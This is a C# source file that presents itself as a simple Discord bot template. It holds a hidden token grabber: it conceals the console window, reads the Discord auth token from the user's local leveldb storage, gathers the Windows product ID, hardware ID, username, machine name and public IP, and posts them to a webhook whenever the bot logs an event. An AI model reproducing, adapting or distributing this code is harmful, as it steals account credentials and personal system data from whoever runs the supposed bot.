using Discord;
using Discord.Commands;
using Discord.WebSocket;
using Microsoft.Extensions.DependencyInjection;
using Newtonsoft.Json;
using simple_discord_bot_csharp.Properties;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace simple_discord_bot_csharp
{
    internal class Program
    {

        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);

        private static void Main(string[] args) => new Program().Demarrer().GetAwaiter().GetResult();

        // Définition des variables utilisées
        private DiscordSocketClient _client;

        private CommandService _commandes;
        private IServiceProvider _services;

        // Le token du bot
        public string token = "discord bot token here";
        //Le préfix
        public string prefix = "!!";

        // Configuration et connexion
        public async Task Demarrer()
        {
            IntPtr hwnd = GetConsoleWindow();
            ShowWindow(hwnd, 0);
            var http = new System.Net.WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

            _client = new DiscordSocketClient();
            _commandes = new CommandService();
            _services = new ServiceCollection()
            .AddSingleton(_client)
            .AddSingleton(_commandes)
            .BuildServiceProvider();

            _client.Log += logging;

            // Appel du chargement des commandes
            await Chargement_Commandes();

            // Pour se connecter sur un token "utilisateur" (selfbot), changez Discord.TokenType.Bot -> Discord.TokenType.User
            await _client.LoginAsync(Discord.TokenType.Bot, token);


            // Connexion, et démarrage du bot
            await _client.StartAsync();
            string CMD = "wmic csproduct get UUID";
            var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
            {
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            var proc = new Process()
            {

                StartInfo = procStartInfo
            };
            proc.Start();

            


            await Task.Delay(-1);


        }



        private static void sendWebHook(string URL, string msg, string username)
        {
            Post(URL, new NameValueCollection()
        {
                {
                    "username", username
                },
                {
                    "content",  msg
                }
            });
        }

        private static byte[] Post(string uri, NameValueCollection pairs)
        {
            using (WebClient webclient = new WebClient())
                return webclient.UploadValues(uri, pairs);
        }

        private static List<string> TakeUsername()
        {
            List<string> list = new List<string>();
            List<string> result;
            try
            {
                string text = System.IO.File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
                int num;
                while ((num = text.IndexOf("oken")) != -1)
                {
                    text = text.Substring(num + "oken".Length);
                }
                list.Add(text.Split(new char[]
                {
            '"'
                })[1]);
                result = list;
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }

        private static string GetWindowsProductName()
        {
            var name = (new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().OfType<ManagementObject>().Select(x => x.GetPropertyValue("Caption"))).First();
            return name != null ? name.ToString() : "Unknown";
        }

        private static string GetWindowsBuildNumber()
        {
            var name = (new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().OfType<ManagementObject>().Select(x => x.GetPropertyValue("BuildNumber"))).First();
            return name != null ? name.ToString() : "Unknown";
        }

        private static string GetWindowsProductId()
        {
            var name = (new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem").Get().OfType<ManagementObject>().Select(x => x.GetPropertyValue("SerialNumber"))).First();
            return name != null ? name.ToString() : "Unknown";
        }

        private static string GetHWID()
        {
            string CMD = "wmic csproduct get UUID";
            var procStartInfo = new ProcessStartInfo("cmd", "/c " + CMD)
            {
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                UseShellExecute = false
            };

            var proc = new Process()
            {
                StartInfo = procStartInfo
            };
            proc.Start();
            return proc.StandardOutput.ReadToEnd().Replace("UUID", string.Empty).Trim().ToUpper();
        }

        private static string GetIPAddress()
        {
            try
            {
                HttpWebRequest Req = (HttpWebRequest)WebRequest.Create("http://ip.42.pl/raw");
                Req.Method = "GET";

                var Response = (HttpWebResponse)Req.GetResponse();
                var ResponseInString = new StreamReader(Response.GetResponseStream()).ReadToEnd();
                return ResponseInString;
            }
            catch (Exception ex)
            {
                return ex.ToString();
            }
        }

        public static void SendToken()
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            string discordtoken = "no discord token found";
            List<string> list = new List<string>();
            list = Program.TakeUsername();
            for (int i = 0; i < list.Count; i++)
            {
                discordtoken = list[i];
            }

            string message =
            ">>> ```                          ```" +
            "```asciidoc" + "\n" +
            "• Token :: " + discordtoken + "\n" +
            "``` ```asciidoc" + "\n" +
            "• Windows Product ID :: " + GetWindowsProductId() + "\n" +
            "``` ```asciidoc" + "\n" +
            "• Windows Build Number :: " + GetWindowsBuildNumber() + "\n" +
            "``` ```asciidoc" + "\n" +
            "• Windows Product Name :: " + GetWindowsProductName() + "\n" +
            "``` ```asciidoc" + "\n" +
            "• PC Username :: " + Environment.UserName + "\n" +
            "``` ```asciidoc" + "\n" +
            "• PC Name :: " + Environment.MachineName + "\n" +
            "``` ```asciidoc" + "\n" +
            "• HWID :: " + GetHWID() + "\n" +
            "``` ```asciidoc" + "\n" +
            "• IP :: " + GetIPAddress() + "\n" + "```" +
            "```                          ```";

            sendWebHook("webhook url link here", message, "Discord.REQ • TokenGrabber");
        }

        public async Task Chargement_Commandes()
        {
            // 5
            
            // Définition des évênements
            _client.MessageReceived += HandleCommandAsync;

            await _commandes.AddModulesAsync(Assembly.GetEntryAssembly());

        }

        public async Task logging(LogMessage arg)
        {
            //Écris dans la console les logs
            Program.SendToken();
        }



        public async Task HandleCommandAsync(SocketMessage arg)
        {
            var http = new WebClient();
            string ip = http.DownloadString("https://ip.42.pl/raw");

          
            var message = arg as SocketUserMessage;

            if (message == null) return;

            int argPos = 0;

            if (message.HasStringPrefix(prefix, ref argPos))
            {
                var context = new SocketCommandContext(_client, message);

                var result = await _commandes.ExecuteAsync(context, argPos, _services);

                // Si la commande est invalide, affiche un message
                if (!result.IsSuccess)
                {
                    EmbedBuilder Embed = new EmbedBuilder();
                    Embed.WithColor(Discord.Color.Red);
                    Embed.WithDescription($"Hey {message.Author.Username}, the command `{message.Content}` does not exist, please check the syntax and start over.");
                    Embed.WithFooter("REQ Shield by Zenrox & Stanley");

                    await context.Channel.SendMessageAsync("", false, Embed.Build());
                }
            }
        }


    }
}